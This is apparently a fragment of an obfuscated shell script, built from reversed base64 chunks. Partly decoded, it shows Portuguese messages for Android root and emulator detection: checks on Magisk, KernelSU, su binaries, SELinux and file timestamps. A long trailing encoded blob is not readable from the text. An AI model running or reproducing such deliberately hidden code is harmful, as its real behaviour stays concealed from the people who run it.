+_c+='fd2bsBCIgACIgACIK4WZoRHI7cSZu9Gawd2XrR2cexncvZGI0xWa1JGILR0UgQWavJHZuFEfrR2c'
+_c+='fVGbn92bndCIFlWctACclJ3ZgwHIiwUQW9FTFR0TNRiIg8GajVGImlGIgACIKkSMtACZhVGagwHI'
+_c+='n01WnACZtAic0BCfgcCJdxlKdtVXet1WcdCIF9WLgAXZydGI8ByJdxFblR2bt5CX0NWdk9mcw5CX'
+_c+='vJ3WcdCIF1CIwVmcnBCfgISRINUQD9FUPJFUkICIvh2YlhCJ9wUQW9FTFR0TNBCIgAiCKkmZgACI'
+_c+='goQM9wUQOdUST91RO9kUUNFI7ETPE5UVPZ0XM90TUByOpkyM9sCVOV1TD91UV9USDlEUTV1UogCI'
+_c+='gACIgACIgogI950ekkCTBZ1XFNUSWVERk0TZjlmdlRmL0NWdk9mcw5ybyhCIPRUQNJVSG50TDBiU'
+_c+='PRUQMVVTFBSXhsVfStHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa0ByOnQyPp0mch9FK/kiN4g3X'
+_c+='oMWayVmbldmXnASRpFXLgAXZydGI8BiIMFkVfV0QJZVRERiIg8GajVGImlGIgACIKkSMtACZhVGa'
+_c+='gwHIn01WnACZtAic0BCfgcCJdxlKdtVXet1WcdCIF9WLgAXZydGI8ByJdxFdjVHZvJHcuwFZslWd'
+_c+='i5CXvJ3WcxXXcV2YpZXZk5CX0NWdk9mcw5CXvJ3WcdCIF1CIwVmcnBCfgISRINUQD9FUPJFUkICI'
+_c+='vh2YlhCJ9wUQW9VRDlkVFREIgACIKoQamBCIgAiCx0DTB50RJN1XH50TSR1UgsTM9QkTV9kRfx0T'
+_c+='PRFI7kSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgAiCi0nT7RSKMFkVfVkUBdFRSFESk0TZ'
+_c+='yF2dkJXYo5ybyhCIPRUQNJVSG50TDBiUPRUQMVVTFBSXhsVfStHJiACd1BHd192Xn9GbgACIgACI'
+_c+='gAiCuVGa0ByOnQSK2gDevJmd8VHaj5WYyxHazlmZkx2bnhiXnASRpFXLgAXZydGI8BiIMFkVfVkU'
+_c+='BdFRSFESkICIvh2YlBiZpBCIgAiCpETLgQWYlhGI8ByJdt1JgQWLgIHdgwHInQSXcpSXb1lXbtFX'
+_c+='nASRv1CIwVmcnBCfgcSXcVmchdHZyFGauwFdv9mYuw1bytFX81FXlJXY3RmchhmLc9mcbx1JgUUL'
+_c+='gAXZydGI8BiIFh0QBN0XQ9kUQRiIg8GajVGKk0DTBZ1XFJVQXRkUBhEIgACIKoQamBCIgAiCx0DT'
+_c+='B50RJN1XH50TSR1UgsTM9QkTV9kRfx0TPRFI7kSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACI'
+_c+='gAiCi0nT7RSKx0TdtVWcuwWZuJXZr5ybyhCIPRUQNJVSG50TDBiUPRUQMVVTFBSXhsVfStHJiACd'
+_c+='1BHd192Xn9GbgACIgACIgAiCuVGa0ByOdBiIxICI9AiIHFETG9VVNVUUkICIbBiZpBCIgAiCpcSX'
+_c+='bdCIk1CIyRHI8ByJk0FXq01Wd51Wbx1JgU0btACclJ3ZgwHIiUXblFnLsVmbyV2au8mciACclJ3Z'
+_c+='gwHIiUESDF0QfB1TSBFJiAyboNWZoQSPHFETG9VVNVUUgACIgogLpI3bsFmdgwWZoAybwVncnByb'
+_c+='tlGdsp7wgwWZg8GbvNHIlFmc0hXZgU2cgciKdtVXet1Jg42bDBiLsFWZyBicvRWYsVXblBib1Bib'
+_c+='lBybzVHbj5WagMCIgACIKwSYiFmchB3cpRGIzF6wtFmagUGdyVWdmBibzOcajFWbylmZu92YgEGd'
+_c+='zVGI5BiIxICIu92YgIXakl2Yul2bjBSYtOMZvBHIhNmb15GInETP11WZx5Cbl5mcltmLvJ3JgMCI'
+_c+='gACIK82clBicvBHIUCo4gUmdhx2YgEGbgEGIvRWYnVGcgI3bsFmdgwWZg8GZuFmalRGIskyJdJ3b'
+_c+='sFmdbBiOdVmdhx2YbdCKgA3byBHdldGIlRGIhVmbtOMbgEmb1ByIgACIgoQZkByclRXZoNmcvNGI'
+_c+='lRGIzFmalJXYwByUPREIzFGbgEWrD32bjBSZzBSegEmchZXYgEmclByJk0FXq4yWcdCIsFmbpdWa'
+_c+='y9GIuN7wpN2YhJHd4VGIhxGI6EEVP5EIjACIgAiCKATPMFkTHl0UfdkTPJFVTBCIgAiCw0DROV1T'
+_c+='G9FTP9EVgACIgogI950ek4iLuMXYz9GajVGcz92cgMXY05WZp1WYyJXZoBSegMXZy9GZhxWdtVGI'
+_c+='vRmbhNWamlmclZFIdtyW9J0ekICI0VHc0V3bfd2bsBCIgAiCiI1TEFETV1URg8CITF0UPh0QFB1U'
+_c+='PNFITFEVOVUSNFkUSVESiAickh2XjV2cgACIgowegkCKn5Was92b091ajVGajpgC9pgIiAyboNWZ'
+_c+='gACIgoQamBCIgAiCi0nT7RychJXd0NWZsBSZyRnblByclRnblJXZo92YgMHctFGdzVWbpRFIdNJn'
+_c+='ivVfHtHJiACd1BHd192Xn9GbgACIgACIgAiClNHblBCIgAiCi0nT7RSKz9mdpRXaz9GczlGZgM3b'
+_c+='oNWdtBiblBCbh1mcv5GKg82YpRXY0NXZgUUTJRVQg0lKb1nQ7RiIgQXdwRXdv91ZvxGIgACIgACI'
+_c+='gogblhGdgsTXgIiMF1USUFEJiASPgISMF1USUFEJiAyWgYiJg0FIiETRNlEVBRiIg4WLgsFImlGb'
+_c+='lBCIgAiCpkiM9sCVOV1TD91UV9USDlEUTV1UogCI7ISfOtHJwcTOxAybxOcYgEmc0NXZ11GI0FGd'
+_c+='zBiOBNUSU14wSNEIBl0QOVEVTl0UO90QOlEIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACIK4WZ'
+_c+='oRHI7ICM3kTMiASctACclJ3ZgwHIiEjUfRVQUNFJiAyboNWZgYWagACIgoQKx0CIkFWZoBCfgcSf'
+_c+='ysXX50CMbpTfysXX50CMbpTfysXX50CMbBSfysXX50CMb1SfysXX50CMb1Sf0sXX50CMbdCIF9WL'
+_c+='gAXZydGI8BiI6M3clN2YB5lIgAXZydGI8BiIyI1XUFEVTRiIg8GajVGKk0jMF1USUFEIgACIKkSM'
+_c+='tACZhVGagwHIn0nM71VOtAzW60nM71VOtAzW60nM71VOtAzWg0nM71VOtAzWt0nM71VOtAzWt0HN'
+_c+='71VOtAzWnASRv1CIwVmcnBCfgIiOzNXZjNWQeJCIwVmcnBCfgISMS9FVBR1UkICIvh2YlhCJ9ETR'
+_c+='NlEVBBCIgAiCKEjJ+IDIsxWdu9idlR2L+AiIsxWdu9idlR2L+IDIFxUSG9FVTVEVkAiZtASbyJCI'
+_c+='sxWZoNHIiRWYgACIgoQKnIHXnACZtAic0BCfgICbsVnbvYXZk9iPyASRMlkRfR1UFRFJgQXY0NnI'
+_c+='gwGblh2cgIGZhhCJ9IjUfRVQUNFIgACIKIDIwVWZsNHIgACIKkyJyx1JgQWLgIHdgwHIiwGb152L'
+_c+='2VGZv4jMgUETJZ0XUNVRURCI0FGdzJCIsxWZoNHIiRWYoQSPxI1XUFEVTBCIgAiCxACclVGbzBCI'
+_c+='gAiCxYiPyACbsVnbvYXZk9iPgICbsVnbvYXZk9iPyASRMlkRfR1UFRFJg4DI0NXZ0ByboNWZiACb'
+_c+='sVGazBiYkFGIgACIKICJk81Y05yLw1GdvwWYj9GbvEGdhR2Li0TRMlkRfR1UFRFIgACIKISfOtHJ'
+_c+='u4iL0FGdzBSYpZHIzBXbhR3cl1Wa0BSZkBSYpNmblJXZo92Yg8GZuF2YpZWayVmVg01Kb1nQ7RiI'
+_c+='gQXdwRXdv91ZvxGIgACIKoQamBCIgAiCpZGIgACIgACIgogI950ekUGduVGdzl2cu92YgEWby9mZ'
+_c+='gUGZgkHIlRnbl1Gbh1mcv5GIhpnbhZXYg8GctVWaUBSXTyp4b13R7RiIgQXdwRXdv91ZvxGIgACI'
+_c+='gACIgACIgAiCuVGa0ByOdBSMgEXZtAySP91TQ1URJRFJgsFImlGblBCIgACIgACIKkSKy0zKU5UV'
+_c+='PN0XTV1TJNUSQNVVThCKgACIgACIgACIgACIKIyZulWbpRHIy9Gcg42sDn2YjVGdlRGIyFGdpZXZ'
+_c+='gEmchBHIq9GblJHIsVGZgEmdpR3YlxWZzBibzOcajFGb1BXauFWbg4WZyVWanV3cgMXZyFGb1dWZ'
+_c+='yJXag8GctVWa0BSZkBycvRHbhNlIggHdj9FIgACIgACIgACIgAiCi0nT7RycvxWY2JXZ05WagUmc'
+_c+='05WZgMXfPRFTBN1ekASZkBSYpNmblJXZmlGZgojUBxUVHVkUSlEIPBVTFlEVgUERg8EVMF0Ug0VI'
+_c+='b1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgACIgAiCuVGa0ByOsxWdu9idlR2L+IDIdBSMgEXZtAyS'
+_c+='P91TQ1URJRFJgsFImYCIdByMgQ3ZtAiIPRFTBNFJiAyWgYWagACIgACIgAiCpkCIxQEItAiMEBiO'
+_c+='gIDRg0CIxQEI/AiMEBiPgEDRggCKk0zTUxUQTBCIgACIgACIK0HI7ETPEVEVDVEVFR0XF1USU9VR'
+_c+='LFkRgsDM9s0Tf9EUNVUSUByOpkyM9sCVOV1TD91UV9USDlEUTV1UogCI7IyQUJFIlRGIuN7wpNWY'
+_c+='sVHcp5WYtBybgUWbpRHdld2XrN2bsNGIlJnYvNHIr92boBSYtJXam52bjBSZ05WZ0NXazJXZwByb'
+_c+='kFGbldmbvNGIvBXbllGViACe0N2XgsjI950ekMDI5BiMgEmc0NXZ11GIlJHduVGIzOseuFmdhByb'
+_c+='uBClAKOIPRUQMV0RO90Qg8EUNVUSUBSXhsVfStHJiACd1BHd192Xn9GbgsHImYCIdBSMgQHbtAiI'
+_c+='yQEJiAyWgACIgACIgAiC9ByOx0DRFR1QFRVRE9VRNlEVfV0SBZEI7ATPL90XPBVTFlEVgsTKpMTP'
+_c+='rQlTV90QfNVVPl0QJB1UVNFKoAyOiMXZsFWZyBycw1WY0NXZtlGdg42bjBCdhN2ZvxGIlRGIz9mc'
+_c+='0NXanVmcgUGZpBXbpBClAKOIvZXa0NWYgUWbpRHIltWYmBSPg8GZhxWZn52bjBybw1WZpRlIggHd'
+_c+='j9FI7ISfOtHJyASegEDIhJHdzVWdtBSZyRnblBysDrnbhZXYg8mbgQJgiDyTEFETFdkTPNEIPBVT'
+_c+='FlEVg0VIb1nU7RiIgQXdwRXdv91ZvxGI7BiJmASXgEDI0xWLgISMERiIgsFIgACIgACIgoQM9s0T'
+_c+='f9EUNVUSUBCIgACIgACIKISfOtHJz1nMEtHJ9d1ekAiOyAybsFmdyVGdulEIgwHIg0nT7Ryc9FDR'
+_c+='7RSfXtHJgoTMg8GbhZnclRnbJBSXqsVfCtHJiACd1BHd192Xn9GbgACIgACIgAiCpkiMUBSLgMDV'
+_c+='ogCJ9IDRgACIgACIgAiCpkSMUBSLgIDVogCJ9EDRgACIgACIgAiCuVGa0ByOdBiIzQFJiAibtAyW'
+_c+='gYiJg0FIiIDVkICIu1CIbBiJmASXgISMURiIg4WLgsFImlGIgACIKoQKnIHXnACZtAic0BCfgICb'
+_c+='sVnbvYXZk9iPyAyclsCIlRXYkJCIsxWZoNHIiRWYoQSPzQFIgACIKIDIwVWZsNHIgACIKkyJyx1J'
+_c+='gQWLgIHdgwHIiwGb152L2VGZv4jMgMXJrASZ0FGZiACbsVGazBiYkFGKk0jMUBCIgAiCyACclVGb'
+_c+='zBCIgAiCpciccdCIk1CIyRHI8BiIsxWdu9idlR2L+IDIzVyKgUGdhRmIgwGblh2cgIGZhhCJ9EDV'
+_c+='gACIgogI950ek4iLukychJHdzVWdtByMoAybw1WZpRHIsVGZg42sDn2clJ3ZvJHcg8GZuVWaklWT'
+_c+='g01Kb1nQ7RiIgQXdwRXdv91ZvxGIgACIKIyTEFETFdkTPNEIvAyTTxUQGByTQ1URJRFIFREION5w'
+_c+='JN0QFRVREJCIyRGafNWZzBCIgAiC7BSKoUWbpR3XltWYm91ajVGajpgC9pgIiAyboNWZgACIgogI'
+_c+='950ek8GZhR3YlRXZkBybuByUGNVdTBSXTyp4b13R7RiIgQXdwRXdv91ZvxGImYCIdBCMgEXZtAyU'
+_c+='GNVVT9FROV1TGRCIbBCIgAiCKkmZgACIgoQM9MlRTV1UfRkTV9kRgsTKpUTPrQlTV90QfNVVPl0Q'
+_c+='JB1UVNFKoACIgACIgACIKISfOtHJE9UTL91UGNVVTRCI68GZhdmchNGITZ0U1NFIvxWdkN7wNBSX'
+_c+='hsVfStHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa0ByOdBiIE9UTL91UGNVVTRiIg4WLgsFImlGI'
+_c+='gACIKkyJyx1JgQWLgIHdgwHIiMTLgQWYlhGI8BCbsVnbvYXZk9iPyAyclxWdk9WbvM2byB3LgMnZ'
+_c+='zV3cgkWLgAXZydmIgwGblh2cgIGZhhCJ9Q0TNt0XTZ0UVNFIgACIKoQamBCIgAiCx0zUGNVVT9FR'
+_c+='OV1TGByOpkSN9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgogI950ek4kUFt0XTZ0UVNFJgozb'
+_c+='kFGbpBXbvNGITZ0U1NFIu92YgwWZuJXZLBSXhsVfStHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa'
+_c+='0ByOdBiIOJVRL91UGNVVTRiIg4WLgsFImlGIgACIKkyJyx1JgQWLgIHdgwHIiMnZzV3cgkWLgAXZ'
+_c+='ydGI8BCbsVnbvYXZk9iPyAictASZtFmb1JCIsxWZoNHIiRWYoQSPOJVRL91UGNVVTBCIgAiCKkmZ'
+_c+='gACIgoQM9MlRTV1UfRkTV9kRgsTKpUTPrQlTV90QfNVVPl0QJB1UVNFKoACIgACIgACIKISfOtHJ'
+_c+='TZ0XTZ0UVNFJgoDbl5mcltGIsVGZgMXblR3c5NXZslmZg4WZgMlRTV3Ug0VIb1nU7RiIgQXdwRXd'
+_c+='v91ZvxGIgACIgACIgogblhGdgsTXgIyUG91UGNVVTRiIg4WLgsFImlGIgACIKkyJyx1JgQWLgIHd'
+_c+='gwHIiMnZzV3cgkWLgAXZydGI8BCbsVnbvYXZk9iPyAyctVGdzl3clxWam9yYvJHcvACdhNmIgwGb'
+_c+='lh2cgIGZhhCJ9MlRfNlRTV1UgACIgogCpZGIgACIKETPTZ0UVN1XE5UVPZEI7kSK10zKU5UVPN0X'
+_c+='TV1TJNUSQNVVThCKgACIgACIgAiCiMXZqFGdu9WbgUGZg42sDn2YjVGdlRGIlRGIsFGdvRHIuN7w'
+_c+='pNXY2VGIUCo4gwWZuJXZrBCblBiblBybkFGbpBXbvNGITZ0U1NFIh1mcpZmbvNGIzZWe0lmc1NWZ'
+_c+='zBiblBSeyRnbFJCI4R3YfBCIgACIgACIKISfOtHJzZ2c1N3L5RXayV3YlN3LsVmbyV2avMXez9CI'
+_c+='uVGIvRWY0NWZ0VGZgMlRTV3Ug0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgICR'
+_c+='OV1TGJCI9AiITl1UfNlRTV1UkICIbBiZpBCIgAiCpciccdCIk1CIyRHI8BCbsVnbvYXZk9iPyAiI'
+_c+='E5UVPZEIvh2YlBiJmAycmNXdz9Se0lmc1NWZz9Cbl5mclt2Lzl3cvACZtACdzVGdiACbsVGazBiY'
+_c+='kFGKk0zUZN1XTZ0UVNFIgACIKoQamBCIgAiCx0zUGNVVT9FROV1TGByOpkSN9sCVOV1TD91UV9US'
+_c+='DlEUTV1UogCIgACIgACIgogIz9Gb1R2sD3GIp5GIiRWYvEGdhR2LgIXZ2BSZkVWdwBybuBSZylmR'
+_c+='gUWZyZEIUCo4gwWZuJXZrBSZkBCblZXauBSYgMHa0FGcgkHIzVmahRnbv1GIhRHb1N2bgMlRTV3U'
+_c+='iACe0N2XgACIgACIgAiCi0nT7RycmNXdz9ycm9yc5N3Lj9mcw9CIuVGIvRWY0NWZ0VGZgMlRTV3U'
+_c+='g0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgICROV1TGJCI9AiID9kUQ91UGNVV'
+_c+='TRiIgsFImlGIgACIKkyJyx1JgQWLgIHdgwHIsxWdu9idlR2L+IDIiQkTV9kRg8GajVGImYCIzZ2c'
+_c+='1N3LzZ2Lzl3cvM2byB3LgQWLgQ3clRnIgwGblh2cgIGZhhCJ9M0TSB1XTZ0UVNFIgACIKoAM9MlR'
+_c+='TV1UfRkTV9kRgACIgogIMVkTSV0SgwURWlkTgEEIU90TSBSREByTU5URJ1UQUxUVD9EIUCo4gMlR'
+_c+='TV1UiAickh2XjV2cgACIgowegkCKzZ2c1N3XrNWZoNmC9pgIiAyboNWZgACIgogI950ek8GZhpnb'
+_c+='hZXYgM3chBXeiBCdv9mcg4WaTBSXTyp4b13R7RiIgQXdwRXdv91ZvxGImYCIdBCMgEXZtACROV1T'
+_c+='G91UTFEUZJEJgsFIgACIKoQamBCIgAiCx0DROV1TG91UTFEUZJEI7kSKz0zKU5UVPN0XTV1TJNUS'
+_c+='QNVVThCKgACIgACIgAiCiUjMvQjMwIDIzJXZ0FWZoNWLGZEIuVGIlRnbll2YlJ3Yg82c1BClAKOI'
+_c+='vlGbw1WYgMXoD3GIJt0RgUGdy9GcvNHIu92YgsmcvZGI9ACd4VmTgU1UsVmbyV2SiACe0N2XgACI'
+_c+='gACIgAiCi0nT7RSK0hXZuV3cr9iYkF2LhRXYk9CKg8ERBR1QFRVREBCVYVkTgU1UMVkTSV0Sg0VI'
+_c+='b1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsjIk5WdvZmIgEXLgAXZydGI8BiISlERfRFW'
+_c+='F5UVTtEJiAyboNWZgYWagACIgoQKnIHXnACZtAic0BCfgICZuV3bmByboNWZgYiJgwGb152L2VGZ'
+_c+='v4jMgQHel5Wdzt2LiRWYvEGdhR2LgMHbiACbsVGazBiYkFGKk0jUJR0XUhVROV1ULBCIgAiCKkmZ'
+_c+='gACIgoQM9QkTV9kRfN1UBBVWCByOpkyM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgogI950e'
+_c+='k4USC9VVTtEJgoDZ1N3agASfZtHJiACd1BHd192Xn9GbgYiJg0FIi4USC9VVTtEJiAibtAyWgACI'
+_c+='gACIgAiCikEUBlHdpJ3ZlRnbJBybt92YgU2YhB3cyV2c1BSZkBycl52bpN2YlRXZkBSZ0lWbvBCl'
+_c+='AKOIsxWYjNXezBSZkBCblZXauBSYgQ3bvJHIhRnbl1WZsBXbpBSVTxWZuJXZLJCI4R3YfBCIgACI'
+_c+='gACIKISfOtHJPRUQUNURUVERgU1UMVkTSV0Sg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogb'
+_c+='lhGdgsjIk5WdvZmIgEXLgAXZydGI8BiISlERfV1ULRiIg8GajVGI8xHIdBiIOlkQfV1ULRiIg4WL'
+_c+='gsFImlGIgACIKkyJyx1JgQWLgIHdgwHIiQmb19mZg8GajVGImYCIsxWdu9idlR2L+IDI1N3avIGZ'
+_c+='h9SY0FGZvAycsJCIsxWZoNHIiRWYoQSPSlERfV1ULBCIgAiCpciccdCIk1CIyRHI8BiIx0CIkFWZ'
+_c+='oBCfgwGb152L2VGZv4jMg42bpNnclZXLtACZ1N3aiACbsVGazBiYkFGKk0jTJJ0XVN1SgACIgogC'
+_c+='pZGIgACIKETPE5UVPZ0XTNVQQllQgsTKpMTPrQlTV90QfNVVPl0QJB1UVNFKoACIgACIgACIKIya'
+_c+='zl2Zh1EIlVXcgIXY0NWZ0VGZgUGZgwWaj16wmlGZgMXoD3GI092byBClAKOIlRnbl1WY0NWZylGZ'
+_c+='gwWZuJXZrBCblBSYlh2YyFGcgg2Y0FGUBJCI4R3YfBCIgACIgACIKISfOtHJpUGdzlGelBCajRXY'
+_c+='wF2LiRWYvEGdhR2LoAyTEFEVDVEVFREIINEVBBVQg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACI'
+_c+='gogblhGdgsjIk5WdvZmIgEXLgAXZydGI8BiITVETJZ0XINEVBBVQkICIvh2YlBiZpBCIgAiCpcic'
+_c+='cdCIk1CIyRHI8BiIk5WdvZGIvh2YlBiJmACbsVnbvYXZk9iPyACajRXYwF2LiRWYvEGdhR2LgMHb'
+_c+='iACbsVGazBiYkFGKk0zUFxUSG9FSDRVQQFEIgACIKoQamBCIgAiCx0DROV1TG91UTFEUZJEI7kSK'
+_c+='z0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgAiCi82ZlVnagwWZkBycl52bpN2YlRXZkBychxGI'
+_c+='lRGI092byBibhRHb1N2bgUWdxByazl2Z5p1LvtWatFGaTBybt92YgM3bsVHZzOcbgEGdpxWaiFGa'
+_c+='gs2cpdWYNJCI4R3YfBCIgACIgACIKISfOtHJpUGdzlGelByazl2Zh12LiRWYvEGdhR2LoAyTEFEV'
+_c+='DVEVFREILNVSHFUTg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgIyUFxUSG91S'
+_c+='Tl0RB1EJiAibtAyWgYWagACIgoQKnIHXnACZtAic0BCfgICbsVnbvYXZk9iPyAyazl2Zh12LiRWY'
+_c+='vEGdhR2LgMHbiACbsVGazBiYkFGKk0zUFxUSG91STl0RB1EIgACIKoQamBCIgAiCx0DROV1TG91U'
+_c+='TFEUZJEI7kSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgAiCl52bkByOi0nT7RSZulGbkACI'
+_c+='9l1ekICI0VHc0V3bfd2bsBybkByOl5WasBictACZhVmcgUGbph2dgwHIiMFUfN1UBBVWCRiIg8Ga'
+_c+='jVGIgACIgACIgogIvtWatFGaT9CdzlGb55WZkBSYtOsdgUmcpZEIlVmcGBSYgQ3bvJHIyFGdsV3Y'
+_c+='vBiblRWZ1BHIUCo4gM3b2lGdjFGI092byBSZkBibzOca0NXZnBSZkBycvNXZj9mcQJCI4R3YfBCI'
+_c+='gACIgACIKISfOtHJp82clN2byBHKg8ERBR1QFRVREByUTFEUZJEIU90TSBSXhsVfStHJiACd1BHd'
+_c+='192Xn9GbgACIgACIgAiCuVGa0ByOdBiITB1XTNVQQllQkICIu1CIbBiZpBCIgAiCpcCev52anASR'
+_c+='pZXLgAXZydGI8ByJ49mY5NXdix3azl2Z5pHfvtWatFGazx3azl2Zh12JgUUatACclJ3ZgwHIiUES'
+_c+='DF0QfNFUkICIvh2YlhCJ9MFUfN1UBBVWCBCIgAiCKATPE5UVPZ0XTNVQQllQgACIgogI950ek4iL'
+_c+='us2cpdWeaBCLvtWatFGaTBCLrNXanFWTg8GZuF2YpZWayVmVg01Kb1nQ7RiIgQXdwRXdv91ZvxGI'
+_c+='gACIKIySTl0RZpFIvAyTLlUTBh0Ug8CILNVSHFUTg8CIPRUQa5UQWFEIU90TSJCIyRGafNWZzBCI'
+_c+='gAiC7BSKoM3chBXei9Fdv9mcft2Ylh2YKowJZJDasllM0ZWYHljdhNTTvt0UCdzQpF0ZJNkQ6p1V'
+_c+='OZWYHJVeJNkSJRFM5w0UVVDSPlmQHNWbstWWTFkdJZEa3J2MOxmWDFkdJVEeUV1R5onWXF1ZMlnQ'
+_c+='UF2RsZDZXRXMJNEOnN1V1EnWX5EMJd2bnl0QBdmUrljVUtmUmNVR5A1U6BzdDd2bnl0QBdmYHljb'
+_c+='YJTOxQGSCFDZDFUaKhEdDZmVzJHWTJ0VahlSwpVbspWWXVzailnQ3NWb5omWY5kdjlnQrp1UC9mY'
+_c+='ykjchdVNuxUa0UnSIR3TmNVSLl0QBdWSFhGUUBDdmVlRKBVU6BzaLdkVqF2R4cWSpJVUVFTOEFVV'
+_c+='OlkUTl0ZmNkQuNWbWdXSDFDcSNVQuplbKBnWHZEOlhkQ2NmMWtmZHhnejdUO6p1VShjYI50dZhlU'
+_c+='qFGS4ZTZXRGcjJDd4MWbslHZYhnehdEb2Q2V0FjS5t2SJNUQnl0Rs1WSGN3ZMdFNnlUaSlEVwkDT'
+_c+='YFjQTRFMNlWSGBzNJhkUvp1V0sUSDF0ZJNUQnl0QCNnYyQmZiNjVwMGSWBTSDl0alFjS5cVeGRWS'
+_c+='GJ0UUBjTGVFM4cmUFV1ZTVUOQNFMs9kU5JkQRFjUKZ1a4YjSIR3TmNVSLl0QBdWSDF0ZJNkQsllM'
+_c+='oZXSDl0aTVUOQNVM5EVVrlDRJlmQ4kESk9WYXhHbJhkSsl1VRdGTYl0ZidEb1pFVzdmWHhzZidUO'
+_c+='uhlM5EDZIJUMkNUQppES0plZTF0ZKdEewJWbVtWZwUTOJp2cnp1R5UnWR92ZJNUQnl0QBdWSDd2b'
+_c+='VFjVUVVRsR0UVljVVFTOERVMW9kVDNXONl3aw9UeCdEVxY1TSZUOJRFM5wEUUV0SJNUQnl0RaB3Q'
+_c+='n92ZJNUQnJ2R54GWykTMkh0JgciQxQ2QBlmSIR3QmZ1cyh1UCdlWYpEca1Gbql1V1smY5JEaj1mT'
+_c+='vFGWaZ3Y5J0aaNlQvJmM5IXYXVjbMlGN1pES09kZTl0SJNUQnlURoBFVwQnZStGbNJlVNljSDhGa'
+_c+='adUSnNmMoxmYHd3ZJ1mWwJWbRdGTyIFakdURnx0MOVzYzIFbiNVQ5BVa5smWYlldi5mVzJ2QChTS'
+_c+='HRWeahVQnx0VsZUSDNmda5mSwp1RGhDTzg2diNjTspFS3ZnYI50diNjTspFS3ZnYI50dZhlUqFGS'
+_c+='3Z3YtxWekN1YnZ2QC52YtZ1dJNUMyk0QkJnYtlDNKlnQ4k0RoxWWXF1ZMRVR3lUaChTSIJVeJNUM'
+_c+='rl0QkN2YpNGcDlWQnl0QCBnWpJkYJNUM1l0QJt2SHZlahdEOnlUaSlEVwkDTYBjWKRVRWRVSpJEO'
+_c+='JhkU5l0QxsWSDRmYP5mT3l1VOx2TsBjbLNVSnhFVzdGZHhGbid2bnl0QBdWSDF0ZJdEe2pVM5YHZ'
+_c+='YJ1dkhVUnlUaSdTVuFjYJZFMnFlVKR0UFx2VUFTTnJVRVd2UFlDUTBDbPJlevtWZwUTOJd2bnl0Q'
+_c+='BdWSDF0ZJdkVqF2R4cWSpJVSUBTOMhFMapEVFZFVJlmQ4kESk9WYXhHbJhkSsl1VRdGTYl0Zap2c'
+_c+='np1R4c2V5FEdilWQpp0RZlWSGBzZKlWWnJ2R54GWykTMkhkQxQ2QBlmSIRnWmNVQnp0RZtWZwUTO'
+_c+='Jp2cnp1R5UnWR92ZJNUQnl0QBdWSDd2bVFjVUVVRsR0UVljVVFTOERVMW9kVDNXONl3aw9UeCdEV'
+_c+='xY1TSZUOJRFM5wEUUV0SJNUQnl0RaB3Qn92ZJNUQnJ2R54GWykTMkhkQxQ2QBlmSIR3QmZ1cyh1U'
+_c+='CdlWYpEca1GbqdCInk1V1smY5JUTVFjQoR2RO9WSDhzZUZkTRJ2MOxmWDJkaj1mRqFmMWhmWHhzZ'
+_c+='MlnQzMWbGd3YHZVeMlGN1pES09kZTl0SJNUQnlkRCxkUxkTSUBTOMB1UR9mWX50bilXQppkRCxkU'
+_c+='xkDRRVlTJJ1UJdmZDJkbj1mV3l0QxAnUTFkbihkT3lFWSpWYIh3cjNjQ2NmMWtmZH5UeZdlTyp1V'
+_c+='SN3YzIkdjJjVrZ2R4p3YHljeadlUzMWbGd3YHZVeKl3aLl0QBdWSHxWbJZ0cnx0V0cWSpJVUTBDZ'
+_c+='mNVR5A1U5l0ZYR1cnR2RoxmYn92ZJNUQnl0QBdWSHhndaFTO2RGWSdHZYF1ZJlmU3UlbxIWSWBzZ'
+_c+='VVkRSZVVWVlUTJURSNlQJRFM5w0UVVDSJVEbPVVMSJEVFZURUp3brVGM1kTSn92ZJNUQnl0QBdWS'
+_c+='HZlahdEOnlUaSF1UwQmZTVUOQNVeJdmZDJ0MhdEbzp1UClnWXZ0aJNUM5lESBdTSHJldJZ0cnx0V'
+_c+='0cWSpJ1dJlmQkl0QZ1WSHhndaFTO2RGWSdHZYF1ZJlmU3cFWwcWSDJ1dKhEdPZ2UJdTSHJldi1WV'
+_c+='Ll0QBdWSDF0ZJNUQvtkROZVVxIkSRBDbQZlVOZWUwkjVUxWUyBFVNB3SUN3ZStWOWR1aSZ2UFlDU'
+_c+='TpHM4NUaBdWSDJUbhF1bLl0QBdWSHhndaFTO2RGWSdHZYF1ZJlmU3ElbxI2SxAzZW1mV5F2VaBXW'
+_c+='yYUdadEOnVlMoBXZuZlckNVQvpFWOpWWXhHaadURnp1RVd2YIpEck1Gbzp1VkBnYz0EcMlGN1pES'
+_c+='09kZTl0SJNUQnlkROl0UWBnVTFTV5o0QoxWWygmdJNUSrVVR0hEWw4kQRBDaGlUaChTSHRWeahVQ'
+_c+='nx0VnAyJrdmSz40bhhFcxE2MV52SR92ZJNUQnVFMop0VsZFTWZVOUZ1aNljSDhGbZJDa2l0QJtWV'
+_c+='G5kZRBjRENVRVlWSId3ZaNjSsN2QBRXYTFkbjJDawVmbWJHZTNGcDlWQnl0QCBnWpJkYJNUM1l0Q'
+_c+='JtWVwgmSXxmVMZ1UJdGWTJEOmNkQil0QxUXSDl0aVBDaKdFbWxkVWlDVWtWTplkRwcTSIJ1badFN'
+_c+='Ll0QBdWSDF0ZJNkQzJmMkZmYzYFMjhkVwk0QJtWZxoUOXlnRklkROl0UWBnVTFTVnJVRWVlUV5UV'
+_c+='RVlUQl0Qox2Yy4EaidkRrl1UCtmWTJ0dj1GbyE2V4xmWywmdjlnQ6F2V0c2YtljdkN0a2oES09kZ'
